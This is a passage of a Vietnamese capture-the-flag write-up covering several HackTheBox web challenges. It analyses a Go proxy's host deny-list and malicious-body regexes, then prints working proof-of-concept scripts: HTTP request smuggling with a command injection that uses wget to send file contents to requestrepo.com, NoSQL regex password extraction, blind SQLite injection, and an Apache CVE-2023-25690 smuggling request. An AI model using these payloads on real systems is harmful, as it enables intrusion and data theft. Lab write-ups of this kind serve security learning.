		frontendConn.Close()
		return
	}

	var hostAddress string = hostArray[0]
	var isIPv4Addr bool = isIPv4(hostAddress)
	var isDomainAddr bool = isDomain(hostAddress)

	if !isIPv4Addr && !isDomainAddr {
		var responseText string = badReqResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	isLocal, err := checkIfLocalhost(hostAddress)
	if err != nil {
		var responseText string = errorResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if isLocal {
		var responseText string = movedPermResponse("/")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	isMalicious, err := checkMaliciousBody(request.Body)
	if err != nil || isMalicious {
		var responseText string = badReqResponse("Malicious request detected")
		prettyLog(1, "Malicious request detected")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	backendConn, err := net.Dial("tcp", host)
	if err != nil {
		var responseText string = errorResponse("Could not connect to backend server")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	_, err = backendConn.Write(requestBytes)
	if err != nil {
		var responseText string = errorResponse("Error sending request to backend")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		backendConn.Close()
		return
	}

	var backendResponse strings.Builder
	var scanner *bufio.Scanner = bufio.NewScanner(backendConn)

	for scanner.Scan() {
		var line string = scanner.Text()
		backendResponse.WriteString(line + "\n")
	}

	if err := scanner.Err(); err != nil {
		var responseText string = errorResponse("Error reading backend response")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		backendConn.Close()
		return
	}

	prettyLog(1, "Forwarding request to: "+host)
	var responseStr string = backendResponse.String()
	frontendConn.Write([]byte(responseStr))
	frontendConn.Close()
	backendConn.Close()
}
```


- Lấy độ dài `length, err := frontendConn.Read(buffer)`.
- Lấy `remoteAddr` : `frontendConn.RemoteAddr().String()`

- Sau đó sẽ gọi hàm `request, err := requestParser(requestBytes, remoteAddr)` với 2 tham số trên:

```
func requestParser(requestBytes []byte, remoteAddr string) (*HTTPRequest, error) {
	var requestLines []string = strings.Split(string(requestBytes), "\r\n")
	var bodySplit []string = strings.Split(string(requestBytes), "\r\n\r\n")

	if len(requestLines) < 1 {
		return nil, fmt.Errorf("invalid request format")
	}

	var requestLine []string = strings.Fields(requestLines[0])
	if len(requestLine) != 3 {
		return nil, fmt.Errorf("invalid request line")
	}

	var request *HTTPRequest = &HTTPRequest{
		RemoteAddr: remoteAddr,
		Method:     requestLine[0],
		URL:        requestLine[1],
		Protocol:   requestLine[2],
		Headers:    make(map[string]string),
	}

	for _, line := range requestLines[1:] {
		if line == "" {
			break
		}

		headerParts := strings.SplitN(line, ": ", 2)
		if len(headerParts) != 2 {
			continue
		}

		request.Headers[headerParts[0]] = headerParts[1]
	}

	if request.Method == HTTPMethods.POST {
		contentLength, contentLengthExists := request.Headers["Content-Length"]
		if !contentLengthExists {
			return nil, fmt.Errorf("unknown content length for body")
		}

		contentLengthInt, err := strconv.Atoi(contentLength)
		if err != nil {
			return nil, fmt.Errorf("invalid content length")
		}

		if len(bodySplit) <= 1 {
			return nil, fmt.Errorf("invalid content length")
		}

		var bodyContent string = bodySplit[1]
		if len(bodyContent) != contentLengthInt {
			return nil, fmt.Errorf("invalid content length")
		}

		request.Body = bodyContent[0:contentLengthInt]
		return request, nil
	}

	if len(bodySplit) > 1 && bodySplit[1] != "" {
		return nil, fmt.Errorf("can't include body for non-POST requests")
	}

	return request, nil
}
```

- Đầu tiên sẽ thực hiện tách code thành các dòng từ `"\r\n"` và gán vào trong mảng `var requestLines []string = strings.Split(string(requestBytes), "\r\n")`
- Sau đó thực hiện tách phần body và header:

```
var bodySplit []string = strings.Split(string(requestBytes), "\r\n\r\n")
```
- Yêu cầu requestLines phải có 1 phần tử trở lên -> lấy dòng đầu tiên của yêu cầu http:


```
var requestLine []string = strings.Fields(requestLines[0])
```
- Yêu cầu mảng này phải có đúng 3 phần tử -> tạo một biến request theo struct `HTTPRequest`:


```
var request *HTTPRequest = &HTTPRequest{
		RemoteAddr: remoteAddr,
		Method:     requestLine[0],
		URL:        requestLine[1],
		Protocol:   requestLine[2],
		Headers:    make(map[string]string),
	}
```

- Tiếp theo nó sẽ thực hiện duyệt vòng for từ phần tử thứ 2 của `requestLines` là các dòng được tách từ yêu cầu http.
- Nếu headerParts := strings.SplitN(line, ": ", 2) tách làm 2 phần và nếu độ dài nó khác 2 thì sẽ bỏ qua vòng lặp với dòng này.
- Nếu bằng 2 thì :

request.Headers[headerParts[0]] = headerParts[1] gán header lần lượt vào.

- Tiếp theo nếu method là POST thì sẽ nhận `contentLength` -> chuyển thành dạng int.
- Nếu length khi tách phần body và phần header <=1 thì trả ra lỗi ngược lại -> gán `request.Body = bodyContent[0:contentLengthInt]` sau đó trả ra request.
- Nếu `len(bodySplit) > 1 && bodySplit[1] != ""` thì trả ra lỗi.
- Cuối cùng hàm này sẽ trả về request -> nếu `request.Protocol != HTTP/1.1` thì tiếp tục -> check `kiểm tra xem URL của yêu cầu (request.URL) có bằng ký tự '/'` -> nếu khác sẽ vượt qua.
- Tiếp tục check nếu `request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115})` nếu `/server-status` còn nếu khác thì vượt qua.
- Check `strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101}))` nếu URL chứa `flushinterface` thì detect.

- Lấy host của request -> cắt thành mảng qua dấu ``:`` -> nếu mảng có khác 2 phần tử  và phần tử thứ 2 == "" thì detect invalid host -> gán host vào `hostPort` nếu tồn tại -> kiểm tra `inRange, err := isDigitInRange(hostPort, 1, 65535)`:

```
func isDigitInRange(s string, min int, max int) (bool, error) {
	num, err := strconv.Atoi(s)
	if err != nil {
		return false, err
	}
	return num >= min && num <= max, nil
}
```

-> chuyển port thành int -> kiểm tra nó có nằm trong khoảng port phù hợp không -> khởi tạo `var hostAddress string = hostArray[0]` -> kiểm tra có phải ipv4 không:

```
func isIPv4(input string) bool {
	if strings.Contains(input, string([]byte{48, 120})) {
		return false
	}
	var ipv4Pattern string = `^(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`
	match, _ := regexp.MatchString(ipv4Pattern, input)
	return match && !blacklistCheck(input)
}
```

- kiểm tra xem chuỗi input có chứa chuỗi "\0x" hay không -> sử dụng biểu thức chính quy để kiểm tra xem chuỗi input có phù hợp với định dạng địa chỉ IPv4 hay không -> kiểm tra xem ip có trong blacklist hay không :

```
func blacklistCheck(input string) bool {
	var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) ||
		strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) ||
		strings.Contains(input, string([]byte{49, 50, 55, 46})) ||
		strings.Contains(input, string([]byte{49, 55, 50, 46})) ||
		strings.Contains(input, string([]byte{49, 57, 50, 46})) ||
		strings.Contains(input, string([]byte{49, 48, 46}))

	return match
}

```

- Kiểm tra có nằm trong iploopback hay không `"localhost"
"0.0.0.0"
"127."
"172."
"192."
"10."`

- Kiểm tra tương tự với domain:

```
func isDomain(input string) bool {
	var domainPattern string = `^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,})$`
	match, _ := regexp.MatchString(domainPattern, input)
	return match && !blacklistCheck(input)
}
```

- Kiểm tra nếu nó không phải là localhost `isLocal, err := checkIfLocalhost(hostAddress)`:

```
func checkIfLocalhost(address string) (bool, error) {
	IPs, err := net.LookupIP(address)
	if err != nil {
		return false, err
	}

	for _, ip := range IPs {
		if ip.IsLoopback() {
			return true, nil
		}
	}

	return false, nil
}
```

- Kiểm tra body chứa các kí tự nguy hiểm:

```
func checkMaliciousBody(body string) (bool, error) {
	patterns := []string{
		"[`;&|]",
		`\$\([^)]+\)`,
		`(?i)(union)(.*)(select)`,
		`<script.*?>.*?</script>`,
		`\r\n|\r|\n`,
		`<!DOCTYPE.*?\[.*?<!ENTITY.*?>.*?>`,
	}

	for _, pattern := range patterns {
		match, _ := regexp.MatchString(pattern, body)
		if match {
			return true, nil
		}
	}
	return false, nil
}
```

- `backendConn, err := net.Dial("tcp", host)` thiết lập kết nối tcp đến host ở header.
- Ghi vào nội dung request:

```
_, err = backendConn.Write(requestBytes)
```
-> sau đó trả ra kết quả

### Bypass ssrf via nip.io DNS binding

- ở đây ta cần gửi request đến localhots 5000 của backend nodejs.

- Nip.io là một dịch vụ DNS tự động chuyển đổi địa chỉ IP thành tên miền phụ dựa trên định dạng nhất định. Ví dụ, nếu địa chỉ IP của máy chủ là 192.0.2.1, ta có thể truy cập vào máy chủ đó bằng cách sử dụng tên miền phụ "192.0.2.1.nip.io".

![image](https://hackmd.io/_uploads/BJXRkg2LR.png)

- Ta có thể sử dụng:
![image](https://hackmd.io/_uploads/ryNreehIA.png)

- Nhưng vẫn bị hàm `checkIfLocalhost` detect -> để ý phần check server-status `/server-status`

```
if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
		var serverInfo string = GetServerInfo()
		var responseText string = okResponse(serverInfo)
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}
```

- ở đây sẽ trả ra serverInfo:

```
func GetServerInfo() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	addrs, err := net.InterfaceAddrs()
	if err != nil {
		addrs = []net.Addr{}
	}

	var ips []string
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ips = append(ips, ipNet.IP.String())
			}
		}
	}

	ipList := strings.Join(ips, ", ")

	info := fmt.Sprintf("Hostname: %s, Operating System: %s, Architecture: %s, CPU Count: %d, Go Version: %s, IPs: %s",
		hostname, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version(), ipList)

	return info
}
```

- Ta sẽ nhận được hostname , Architecture, Operating System, IPs, Go Version.


-> nhận được ip của container `192.168.26.170`:

![image](https://hackmd.io/_uploads/rkBcVl280.png)


- 192.168.82.66 ở đây có vẻ chính là địa chị ip của phần backend xử lý được mở ở port 5000. Như đã phân tích từ đầu ta cần gọi các endpoint của Phần xử lý backend của NodeJS như /flushInterface để trigger RCE. Dó đó, ta có thể sử dụng ip này bypass qua blacklist check, thay vì sử dụng 192. ta hoàn toàn có thể sử dụng được 192- và điều này cũng được cho phép bởi nip.io dash notation: magic-127-0-0-1.nip.io

- Bypass thành công SSRF với nip.io:



- Mục tiêu của ta là truy cập đến endponit flushInterface của node server để trigger RCE.

- Khi truy cập thì nó bị detect có chuỗi này trong req nên không access đến được:


```
if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
		var responseText string = badReqResponse("Not Allowed")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

```

- Như phần check ở trên ta hướng tới request smuggling
- Có thể thấy một điều kì lạ là nếu ta tiếp sử dụng ``\r\n\r\n`` để gửi request thứ hai (smuggling) và bằng cách cố định việc truyền Content-Length: 1 và phần body với length tương đương, lúc này request parser sẽ coi phần thân lúc này chỉ là byte đầu với length là 1, điều này có nghĩa là khi checkMaliciousBody kiểm tra nó sẽ chỉ xem xét duy nhất byte này mà không tiến hành check requests thứ hai.


```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$ python3 index.py
b'HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 37\nETag: W/"25-+Jf7C2mDx/nvPFRCWncafprqHNs"\nDate: Fri, 28 Jun 2024 09:49:43 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{"message":"Error getting addresses"}HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 38\nETag: W/"26-1CQv+OK4Js7XnYldCbe/Ju97dzY"\nDate: Fri, 28 Jun 2024 09:49:43 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{"message":"Error flushing interface"}\n'
l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$

```

- Như ta thấy thì ở đây ta có thể nhận được phản hồi của cả 2 endpoint.
- Bây giờ thì chỉ cần commandi để rce và nhận flag thôi

![image](https://hackmd.io/_uploads/HJfqqb280.png)


```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$ python3 index.py
b'HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 37\nETag: W/"25-+Jf7C2mDx/nvPFRCWncafprqHNs"\nDate: Fri, 28 Jun 2024 10:04:52 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{"message":"Error getting addresses"}HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 38\nETag: W/"26-1CQv+OK4Js7XnYldCbe/Ju97dzY"\nDate: Fri, 28 Jun 2024 10:04:52 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{"message":"Error flushing interface"}\n'
l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$

```

![image](https://hackmd.io/_uploads/r18QjbnU0.png)

poc:

```
# pip install pickora

import socket
from pickora import Compiler
import base64
from urllib.parse import quote_from_bytes

compiler = Compiler(extended=True)

HTTP_MSG = b"POST /getAddresses HTTP/1.1\r\n"
HTTP_MSG+= b"Host: magic-192-168-198-26.nip.io:5000\r\n"
HTTP_MSG+= b"Content-Type: application/x-www-form-urlencoded\r\n"
HTTP_MSG+= b"Content-Length: 1" + b"\r\n"
HTTP_MSG+= b"\r\n"
HTTP_MSG+= b"a" + b"\r\n"
HTTP_MSG+= b"\r\n"
HTTP_MSG+= b"POST /flushInterface HTTP/1.1\r\n"
HTTP_MSG+= b"Host: localhost:5000\r\n"
HTTP_MSG+= b"Content-Type: application/json\r\n"
HTTP_MSG+= b"Content-Length: 79" + b"\r\n"
HTTP_MSG+= b"\r\n"
HTTP_MSG+= b"{\"interface\":\";wget${IFS}http://requestrepo.com/0toin6os/?a=`cat${IFS}/*.txt`\"}\r\n"

TARGET = ("83.136.252.57", 47831)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ss:
  ss.connect(TARGET)
  ss.send(HTTP_MSG)
  res = ss.recv(1024)
  print(res)
```


flag: `HTB{re3nv3nt1ng_th3_wh33l_suck5}`


tài liệu: https://nip.io/
wu tác giả: https://github.com/hackthebox/business-ctf-2024/tree/main/web/%5BEasy%5D%20HTB%20Proxy



## Wild Goose Hunt

- Đổi gió với một chall nodejs cùng mongodb.


```
const express    = require('express');
const app        = express();
const bodyParser = require('body-parser');
const routes     = require('./routes');
const mongoose   = require('mongoose');

mongoose.connect('mongodb://localhost:27017/heros', { useNewUrlParser: true , useUnifiedTopology: true });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ 
	extended: true 
}));

app.use(express.static('static'));
app.set('view engine', 'pug');

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.listen(1337, () => console.log('Listening on port 1337'));
```

- có thể thấy trang web có sử dụng template pugjs và chạy local trên port 1337.

- Các api chính của server:

```
const express = require('express');
const router  = express.Router();
const User    = require('../models/User');

router.get('/', (req, res) => {
	return res.render('index');
});

router.post('/api/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return User.find({ 
			username,
			password
		})
			.then((user) => {
				if (user.length == 1) {
					return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` });
				} else {
					return res.json({logged: 0, message: 'Login Failed'});
				}
			})
			.catch(() => res.json({ message: 'Something went wrong'}) );
	}
	return res.json({ message: 'Invalid username or password'});
});

module.exports = router;
```

- Có thể thấy ở đây có 2 endpoint đó là / và /api/login.
- Đi vào api/login.

- Có thể thấy server sẽ nhận username và password của người dùng sau đó tìm trong mongo xem có bản ghi nào không nếu có thì hiển thị với json là đăng nhập thành công + tên user.
- Và flag là mật khẩu của admin:


```
#!/bin/bash

# Secure entrypoint
chmod 600 /entrypoint.sh
mkdir /tmp/mongodb

# Start mongodb
mongod --noauth --dbpath /tmp/mongodb/ &

# Wait for mongodb
until nc -z localhost 27017; do echo "not up" && sleep 1; done

# Populate mongodb
mongosh heros --eval "db.createCollection('users')"
mongosh heros --eval 'db.users.insert( { username: "admin", password: "HTB{f4k3_fl4g_f0r_t3st1ng}"} )'

# Run services
/usr/bin/supervisord -c /etc/supervisord.conf

```

- Vậy bây giờ chỉ có hướng là nosqli để lấy pass của admin thôi.

![image](https://hackmd.io/_uploads/B1s-u7hLR.png)

- Thử chuyển thành application/json thì vẫn nhận:

![image](https://hackmd.io/_uploads/By0uumh8A.png)

- Vậy thì khả năng cao sẽ là nosqli:

![image](https://hackmd.io/_uploads/rkzpd73IR.png)

- Thử một cái được luôn -> vấn đề là làm sao để dumb được password của admin -> DÙNG regex để check password của admin:

```
import requests
import string
import json
url = "http://94.237.59.63:45903/api/login"
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    password = "HTB{"
    while True:
        for c in possible_chars:
            payload = {"username": "admin","password":  {"$regex":password+c+ ".*" }}
            pr = requests.post(url ,data=json.dumps(payload), headers=headers)
            if "admin" in pr.text:
                password += c
                print(password)
                break
    if c == possible_chars[-1]:
        print("Found password "+password[0:].replace("\\", "")+" for username "+username)
get_password("admin")
```

![image](https://hackmd.io/_uploads/Skpr07hIA.png)


flag : `HTB{th3_4l13ns_h4v3nt_us3d_m0ng0db_I_gu3ss!}`

## emoji voting

- Tiếp tục một chall với nodejs:

```

const express       = require('express');
const app           = express();
const bodyParser    = require('body-parser');
const routes        = require('./routes');
const path          = require('path');
const Database      = require('./database');

const db = new Database('emoji-voting.db');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));
app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

(async () => {
    await db.connect();
    await db.migrate();

    app.listen(1337, () => console.log('Listening on port 1337'));
})();

```
- Sử dụng db:

```
const sqlite = require('sqlite-async');
const crypto = require('crypto');

class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
    async connect() {
        this.db = await sqlite.open(this.db_file);
    }

    async migrate() {
        let rand = crypto.randomBytes(5).toString('hex');

        return this.db.exec(`
            DROP TABLE IF EXISTS emojis;
            DROP TABLE IF EXISTS flag_${ rand };

            CREATE TABLE IF NOT EXISTS flag_${ rand } (
                flag TEXT NOT NULL
            );

            INSERT INTO flag_${ rand } (flag) VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');

            CREATE TABLE IF NOT EXISTS emojis (
                id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                emoji   VARCHAR(255),
                name    VARCHAR(255),
                count   INTEGERT
            );

            INSERT INTO emojis (emoji, name, count) VALUES 
                ('👽', 'alien', 13),
                ('🛸', 'flying saucer', 3),
                ('👾', 'alien monster', 0),
                ('💩', '👇 = human', 118),
                ('🚽', '👇 = human', 19),
                ('🪠', '👇 = human', 2),
                ('🍆', 'eggplant', 69),
                ('🍑', 'peach', 40),
                ('🍌', 'banana', 21),
                ('🐶', 'dog', 80),
                ('🐷', 'pig', 37),
                ('👨', 'homo idiotus', 124)
        `);
    }

    async vote(id) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = 'UPDATE emojis SET count = count + 1 WHERE id = ?';
                resolve(await this.db.run(query, [id]));
            } catch(e) {
                reject(e);
            }
        });
    }

    async getEmojis(order) {
        // TOOD: add parametrization
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
                resolve(await this.db.all(query));
            } catch(e) {
                reject(e);
            }
        });
    }
}

module.exports = Database;

```

- ở đây ta có thể thấy có một class `Database` khởi tạo với .db và có các method như trên.
- Và để ý method:

```
async migrate() {
        let rand = crypto.randomBytes(5).toString('hex');

        return this.db.exec(`
            DROP TABLE IF EXISTS emojis;
            DROP TABLE IF EXISTS flag_${ rand };

            CREATE TABLE IF NOT EXISTS flag_${ rand } (
                flag TEXT NOT NULL
            );

            INSERT INTO flag_${ rand } (flag) VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');

            CREATE TABLE IF NOT EXISTS emojis (
                id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                emoji   VARCHAR(255),
                name    VARCHAR(255),
                count   INTEGERT
            );

            INSERT INTO emojis (emoji, name, count) VALUES 
                ('👽', 'alien', 13),
                ('🛸', 'flying saucer', 3),
                ('👾', 'alien monster', 0),
                ('💩', '👇 = human', 118),
                ('🚽', '👇 = human', 19),
                ('🪠', '👇 = human', 2),
                ('🍆', 'eggplant', 69),
                ('🍑', 'peach', 40),
                ('🍌', 'banana', 21),
                ('🐶', 'dog', 80),
                ('🐷', 'pig', 37),
                ('👨', 'homo idiotus', 124)
        `);
    }
```
- Đây là nơi flag được chèn vào bảng flag_* với tên bảng flag được random đuôi.
- giờ thì xem các api của challenge:

```
const path      = require('path');
const express   = require('express');
const router    = express.Router();

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/vote', (req, res) => {
	let { id } = req.body;

	if (id) {
		return db.vote(id)
			.then(() => {
				return res.send(response('Successfully voted')) ;
			})
			.catch((e) => {
				return res.send(response('Something went wrong'));
			})
	}

	return res.send(response('Missing parameters'));
})

router.post('/api/list', (req, res) => {
	let { order } = req.body;

	if (order) {
		return db.getEmojis(order)
			.then(data => {
				if (data) {
					return res.json(data);
				}

				return res.send(response('Seems like there are no emojis'));
			})
			.catch((e) => {
				return res.send(response('Something went wrong'));
			})
	}

	return res.send(response('Missing parameters'))
});	

module.exports = database => { 
	db = database;
	return router;
};
```

- route / để hiển thị trang index.html
- route /api/vote -> nhận id sau đó gọi method vote(id):

```

async vote(id) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = 'UPDATE emojis SET count = count + 1 WHERE id = ?';
                resolve(await this.db.run(query, [id]));
            } catch(e) {
                reject(e);
            }
        });
    }
```

- Nó sẽ update bảng emojis và set giá trị của count tăng lên 1 với id được truyền vào thì đây là logic đơn giản của chức năng vote.

- Route /api/list sẽ nhận giá trị order -> gọi method `getEmojis(order)`:


```
async getEmojis(order) {
        // TOOD: add parametrization
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
                resolve(await this.db.all(query));
            } catch(e) {
                reject(e);
            }
        });
    }
```

- Lấy tất cả các bản ghi từ emojis sắp xếp theo order -> như ta có thể thấy là ở đây bị dính sqli -> có thể dumb được db.
- Lưu ý là migrate đã được gọi rồi nên flag đã được insert vào bảng flag:

```
(async () => {
    await db.connect();
    await db.migrate();

    app.listen(1337, () => console.log('Listening on port 1337'));
})();

```

- Db sử dụng là sqlite
### exploit


![image](https://hackmd.io/_uploads/SJSuVE280.png)


poc:

```
import requests, time


def send_payload(url, sqli):
    _headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0",
                "Content-Type": "application/x-www-form-urlencoded"}
    _data = {"order": sqli}
    resp = requests.post(url, headers=_headers, data=_data).text
    if 'alien' in resp:
        return True
    else:
        return False


def sqli():
    url = "http://94.237.51.179:45595/api/list"

    sqli_temp = '1 limit _LEFT_ = _RIGHT_'

    left = '(select length(name) from sqlite_master where name like \'flag%\')'

    for i in range(1, 21):

        sqli = sqli_temp.replace('_LEFT_', left)
        sqli = sqli.replace('_RIGHT_', str(i))

        print(i, end='\r')

        res = send_payload(url, sqli)

        if res:
            dataLength = i
            break

    print("\n\n[+] Found tablename length: %s\n" % dataLength)

    flag_table = 'flag_'

    # extract flag table name

    for charPos in range(6, dataLength + 1):

        left = '(select unicode(substr(name,_POS_,1)) from sqlite_master where name like \'flag%\')'.replace('_POS_',
                                                                                                             str(charPos))

        for char in range(32, 127):
            sqli = sqli_temp.replace('_LEFT_', left)
            sqli = sqli.replace('_RIGHT_', str(char))

            res = send_payload(url, sqli)

            if res:
                flag_table = flag_table + chr(char)
                print(flag_table, end='\r')
                break

    print("\n\n[+] Extracted flag tablename: %s\n" % flag_table)

    # get length of flag content
    left = '(select length(flag) from %s)' % flag_table

    for i in range(1, 70):

        sqli = sqli_temp.replace('_LEFT_', left)
        sqli = sqli.replace('_RIGHT_', str(i))

        print(i, end='\r')

        res = send_payload(url, sqli)

        if res:
            flagDataLength = i
            break

    print("\n\n[+] Found flag data length: %s\n" % flagDataLength)

    flag_data = ''

    for charPos in range(1, flagDataLength + 1):

        left = '(select unicode(substr(flag,%d,1)) from %s)' % (charPos, flag_table)

        for char in range(32, 127):
            sqli = sqli_temp.replace('_LEFT_', left)
            sqli = sqli.replace('_RIGHT_', str(char))
            res = send_payload(url, sqli)

            if res:
                flag_data = flag_data + chr(char)
                print(flag_data, end='\r')
                break

    print("\n\n[+] Extracted flag data: %s\n" % flag_data)


def main():
    sqli()


if __name__ == '__main__':
    main()

```

## ApacheBlaze

- Một chall với be là flask + fe là html + js thuần.

### Backend

```
from flask import Flask, request, jsonify

app = Flask(__name__)

app.config['GAMES'] = {'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}
app.config['FLAG'] = 'HTB{f4k3_fl4g_f0r_t3st1ng}'

@app.route('/', methods=['GET'])
def index():
    game = request.args.get('game')

    if not game:
        return jsonify({
            'error': 'Empty game name is not supported!.'
        }), 400

    elif game not in app.config['GAMES']:
        return jsonify({
            'error': 'Invalid game name!'
        }), 400

    elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200

    else:
        return jsonify({
            'message': 'This game is currently unavailable due to internal maintenance.'
        }), 200

```

- đầu tiên server sẽ cofig giá trị "GAMES" với các giá trị chuỗi -> flag nằm ở config "FLAG"
- Server chỉ có một route duy nhất là get `/` -> nhận một param `game` -> và yêu cầu game phải nằm trong dãy `{'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}` 


```
elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200
```


- Nếu game là `click_topia` -> check X-Forwarded-Host là `dev.apacheblaze.local` thì nhận được FLAG.


### Exploit CVE-2023-25690 HTTP Request Smuggling

![image](https://hackmd.io/_uploads/SJx2B4RwA.png)


```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/api/games/click_topia HTTP/1.1
Host: 94.237.59.63:34746
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://94.237.59.63:34746/
Priority: u=0
```

![image](https://hackmd.io/_uploads/HylAjE8zdA.png)

### Explain

- Quan sát phần config httpd.conf:

````
<VirtualHost *:1337>

    ServerName _

    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on

    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"

</VirtualHost>
````
- Trong docker ta có thấy server sử dụng bản `RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz && tar -xvf httpd-2.4.55.tar.gz
` searching ta cũng thấy dính CVE trên


poc: https://github.com/dhmosfunk/CVE-2023-25690-POC?tab=readme-ov-file#advisory-description
https://whitehat.vn/threads/xuat-hien-poc-cho-lo-hong-nghiem-trong-trong-may-chu-apache-http.17263/

flag: `HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}`


## RenderQuest

![image](https://hackmd.io/_uploads/H1ispLzOC.png)


![image](https://hackmd.io/_uploads/S1inpLf_C.png)

![image](https://hackmd.io/_uploads/Hk9gCLG_0.png)

![image](https://hackmd.io/_uploads/rkeaGRLGd0.png)

![image](https://hackmd.io/_uploads/r1lmRLGuC.png)


flag : `HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}`